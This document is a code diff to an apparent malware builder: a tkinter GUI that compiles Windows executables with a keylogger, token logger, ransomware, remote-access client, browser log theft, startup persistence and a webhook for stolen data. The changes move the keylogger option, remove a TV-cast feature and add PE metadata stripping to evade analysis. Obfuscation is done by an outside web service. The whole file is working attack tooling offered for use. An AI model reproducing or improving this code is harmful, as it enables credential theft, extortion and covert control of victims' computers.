@@ -5,7 +5,7 @@ from tkinter import filedialog as fd
 from bit import SUPPORTED_CURRENCIES
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-import customtkinter, subprocess, Cryptodome, websocket, threading, coincurve, requests, tkinter, random, shutil, base64, zlib, fade, time, bit, os
+import customtkinter, subprocess, Cryptodome, websocket, threading, coincurve, requests, tkinter, random, pefile, shutil, base64, zlib, fade, time, bit, os
 
 customtkinter.set_appearance_mode("dark")
 
@@ -43,7 +43,7 @@ class ScrollableFrame(customtkinter.CTkScrollableFrame):
         )
 
         filename = fd.askopenfilename(
-            title='Open a file',
+            title='Select a file',
             initialdir='/',
             filetypes=filetypes)
 
@@ -106,25 +106,14 @@ class Frame(customtkinter.CTkFrame):
                 continue
 
             else:
-                extension = "ico" if title == "File Icon" else "mp4"
+                self.icon = tkinter.StringVar(value="")
 
-                if extension == "ico":
-                    self.icon = tkinter.StringVar(value="")
-
-                else:
-                    self.cast_file = tkinter.StringVar(value="")
-
-                widget = widget_type(master=self, text=title, command=lambda: self.file_prompt(extension))
+                widget = widget_type(master=self, text=title, command=lambda: self.file_prompt())
                 widget.grid(row=x, column=2, sticky="ew")
 
-                if extension == "ico":
-                    widgets[title] = self.icon
-
-                else:
-                    widgets[title] = self.cast_file
+                widgets[title] = self.icon
 
                 continue
-                
 
             widgets[title] = widget
             widget.grid(row=x, column=2, sticky="nsew")
@@ -142,21 +131,17 @@ class Frame(customtkinter.CTkFrame):
             if isinstance(widget, customtkinter.CTkEntry):
                 widget.configure(state="disabled" if not state else "normal")
 
-    def file_prompt(self, extension):
+    def file_prompt(self):
         filetypes = (
-            (f'{extension.upper()} files', f'*.{extension}'),
+            (f'ICO files', f'*.ico'),
         )
 
         filename = fd.askopenfilename(
-            title='Open a file',
+            title='Select File Icon',
             initialdir='/',
             filetypes=filetypes)
 
-        if extension == "ico":
-            self.icon.set(filename)
-
-        else:
-            self.cast_file.set(filename)
+        self.icon.set(filename)
 
 class App(customtkinter.CTk):
     def __init__(self):
@@ -262,16 +247,15 @@ class App(customtkinter.CTk):
         connection_widgets = {
             "Connect To Server": customtkinter.CTkCheckBox,
             "Dynamic Webhook": customtkinter.CTkCheckBox,
+            "Key Logger": customtkinter.CTkCheckBox,
             "Server Address": customtkinter.CTkEntry,
             "Server Password": customtkinter.CTkEntry,
             "Webhook": customtkinter.CTkEntry,
-            "Tv Cast File": customtkinter.CTkButton,
         }
         
         connection_frame = Frame(master=main_frame, default=[4], widgets=connection_widgets, row=0, column=5, columnspan=3, rowspan=14, pady=0, padx=20)
 
         misc_widgets = {
-            "Key Logger": customtkinter.CTkCheckBox,
             "Browser Logs": customtkinter.CTkCheckBox,
             "Add To Startup": customtkinter.CTkCheckBox,
             "File Icon": customtkinter.CTkButton,
@@ -312,7 +296,6 @@ class App(customtkinter.CTk):
         massdm_script = ''
         keylogger = False
         dynamic_webhook = False
-        cast_file = 0
         
         ransomware = ransomware_config["Ransomware"].get()
         if ransomware:
@@ -335,11 +318,10 @@ class App(customtkinter.CTk):
             server_addr = base64.b64encode(connection_config['Server Address'].get().replace('https://', '').replace('http://', '').replace('wss://', '').replace('ws://', '').split('/')[0].encode()).decode()
             server_key = base64.b64encode(connection_config['Server Password'].get().encode()).decode()
             dynamic_webhook = connection_config['Dynamic Webhook'].get()
-            cast_file = connection_config['Tv Cast File'].get()
+            keylogger = connection_config['Key Logger'].get()
             
         webhook = connection_config['Webhook'].get()
-
-        keylogger = misc_config['Key Logger'].get()
+        
         browser = misc_config['Browser Logs'].get()
         startup = misc_config['Add To Startup'].get()
         icon = misc_config['File Icon'].get()
@@ -380,7 +362,7 @@ class App(customtkinter.CTk):
             "ADMIN": admin
         }
 
-        self.compile(config, icon, admin, windowed, binder_files, cast_file)
+        self.compile(config, icon, admin, windowed, binder_files)
 
     @staticmethod
     def banner():
@@ -395,11 +377,11 @@ class App(customtkinter.CTk):
  ▄████████▀    ██████████  ▄████▀         ▄████▀   █▀   ████████▀  ████       ███▄ 
         """))
 
-    def compile(self, config, icon, admin, windowed, binder_files, cast_file):
+    def compile(self, config, icon, admin, windowed, binder_files):
         request = requests.get('https://septicx.pythonanywhere.com/api/obfuscate', json={
             "options": {
                 "base": 27500 + random.randint(-20000, 27500),
-                "recursion": 2,
+                "recursion": 3,
                 "bytes": True
             },
             "config": config,
@@ -410,6 +392,7 @@ class App(customtkinter.CTk):
 
         if request.status_code != 200:
             self.response_label.configure(text='Error: Webserver failed to compile successfully')
+            print(request.text)
             return
         
         token_logger = config["TOKEN_LOGGER"]
@@ -458,10 +441,6 @@ class App(customtkinter.CTk):
 
             binder_args += ['--add-data', f'{dir}\\src\\temp\\binder_{filename};.']
 
-        if cast_file:
-            filename = cast_file.split("/")[-1]
-            shutil.copyfile(cast_file, f'{dir}\\src\\temp\\cast_{filename}')
-
         coincurve_path = "\\".join(coincurve.__file__.split("\\")[:-1])
         cryptodome_path = "\\".join(Cryptodome.__file__.split("\\")[:-1])
         bit_path = "\\".join(bit.__file__.split("\\")[:-1])
@@ -477,6 +456,7 @@ class App(customtkinter.CTk):
             '--hidden-import','requests',
             '--hidden-import','winsound', 
             '--hidden-import','win32api',
+            '--hidden-import','tempfile',
             '--hidden-import','win32gui', 
             '--hidden-import','win32con',
             '--hidden-import','win32ui', 
@@ -506,13 +486,11 @@ class App(customtkinter.CTk):
 
         keylogger_imports = [
             '--hidden-import', 'keyboard', 
-            '--hidden-import', 'tkinter'
         ] if keylogger else []
 
         ransomware_imports = [
             '--hidden-import', 'cryptography.fernet',
             '--hidden-import', 'Cryptodome.Cipher.AES',
-            '--hidden-import', 'tkinter', 
             '--hidden-import', 'bit', 
             
         ] if ransomware else []
@@ -522,8 +500,7 @@ class App(customtkinter.CTk):
             '--hidden-import', 'websocket', 
             '--hidden-import', 'discord',
             '--hidden-import', 'pyaudio',
-            '--hidden-import', 'tkinter',
-            '--hidden-import','cv2'
+            '--hidden-import', 'cv2'
         ] if rat_client else []
 
         browser_imports = [
@@ -542,14 +519,54 @@ class App(customtkinter.CTk):
 
         imports = default_imports + keylogger_imports + ransomware_imports + server_imports + browser_imports + discord_imports
 
-        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed' if windowed else '', '--onefile', '--clean'] + imports + ['--icon', icon if icon else 'NONE', '--upx-dir', 'build\\upx', '--upx-exclude', '_uuid.pyd', '--upx-exclude', 'python3.dll', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data' if ransomware else '', f'{coincurve_path};coincurve' if ransomware else '', '--add-data' if ransomware else '', f'{cryptodome_path};Cryptodome' if ransomware else '', '--add-data' if ransomware else '', f'{bit_path};bit' if ransomware else '', '--add-data' if ransomware else '', f'{dir}\\src\\temp\\instructions.txt;.' if ransomware else '', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + [f'{dir}\\src\\output.py']
+        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed' if windowed else '', '--onefile', '--clean'] + imports + ['--icon', icon if icon else 'NONE', '--upx-dir', 'build\\upx', '--upx-exclude', '_uuid.pyd', '--upx-exclude', 'python3.dll', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data' if ransomware else '', f'{coincurve_path};coincurve' if ransomware else '', '--add-data' if ransomware else '', f'{cryptodome_path};Cryptodome' if ransomware else '', '--add-data' if ransomware else '', f'{bit_path};bit' if ransomware else '', '--add-data' if ransomware else '', f'{dir}\\src\\temp\\instructions.txt;.' if ransomware else '', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.'] + binder_args + [f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
 
         subprocess.call(command, shell=True)
 
-        if os.path.exists(f"{dir}\\dist\\output.exe"):
+        file_path = f"{dir}\\dist\\output.exe"
+        temp_path = f"{dir}\\dist\\temp.exe"
+
+        # Remove Meta Data
+        pe = pefile.PE(file_path)
+
+        fake_time = int(time.mktime(time.strptime('2000-01-01 00:00:00', '%Y-%m-%d %H:%M:%S')))
+        pe.FILE_HEADER.TimeDateStamp = fake_time
+
+        for entry in pe.DIRECTORY_ENTRY_DEBUG:
+            entry.struct.TimeDateStamp = fake_time
+            entry.struct.PointerToRawData = 0
+            entry.struct.AddressOfRawData = 0
+            entry.struct.MajorVersion = 0
+            entry.struct.MinorVersion = 0
+            entry.struct.Type = 0
+            entry.struct.SizeOfData = 0
+
+        if hasattr(pe, 'FileInfo'):
+            for fileinfo in pe.FileInfo:
+                for entry in fileinfo:
+                    if hasattr(entry, 'StringTable'):
+                        for st in entry.StringTable:
+                            st.entries.clear()
+
+        pe.write(temp_path)
+        pe.close()
+
+        os.remove(file_path)
+        os.rename(temp_path, file_path)
+
+        with open(file_path, "rb") as f:
+            data = f.read()
+
+        # Replace known strings
+        # data = data.replace(b'MEIPASS', b'MAEPISS')
+
+        with open(file_path, "wb") as f:
+            f.write(data)
+
+        if os.path.exists(file_path):
 
             self.response_label.configure(text='EXE in dist folder')
             print(self.color('Your file is in the dist folder named "output.exe"'))
